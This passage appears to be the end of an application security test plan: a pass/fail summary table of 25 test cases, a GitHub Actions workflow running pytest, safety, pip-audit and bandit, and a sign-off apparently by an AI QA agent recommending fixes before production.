| Category | Total | Pass | Fail | Unknown |
|----------|-------|------|------|---------|
| Authentication | 8 | 3 | 3 | 2 |
| Injection | 5 | 3 | 0 | 2 |
| XSS/Content | 3 | 2 | 1 | 0 |
| Rate Limiting | 2 | 1 | 1 | 0 |
| DOS Protection | 3 | 2 | 1 | 0 |
| CORS | 1 | 0 | 1 | 0 |
| Logging | 1 | 0 | 1 | 0 |
| Dependencies | 1 | 0 | 0 | 1 |
| Integration | 1 | 0 | 0 | 1 |
| **TOTAL** | **25** | **11** | **8** | **6** |

### Overall Score: 44% Pass (FAIL)

---

## CONTINUOUS TESTING

### CI/CD Integration

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-test.txt
          pip install safety pip-audit bandit

      - name: Run security tests
        run: |
          pytest tests/security/ -v --tb=short

      - name: Dependency scan
        run: |
          safety check
          pip-audit

      - name: Static security scan
        run: |
          bandit -r app/ -f json -o bandit-report.json
```

---

## SIGN-OFF

**Test Plan Created By:** LOVELESS (QA Security Agent)
**Date:** 2025-10-15
**Status:** READY FOR EXECUTION
**Coverage:** 25 test cases across 9 security domains

**Recommendation:** Execute P0 tests immediately, address failures before any production deployment.

**Next Steps:**
1. Set up test environment
2. Execute all P0 tests
3. Fix identified issues
4. Re-test until all P0 tests pass
5. Execute P1 tests
6. Conduct penetration testing
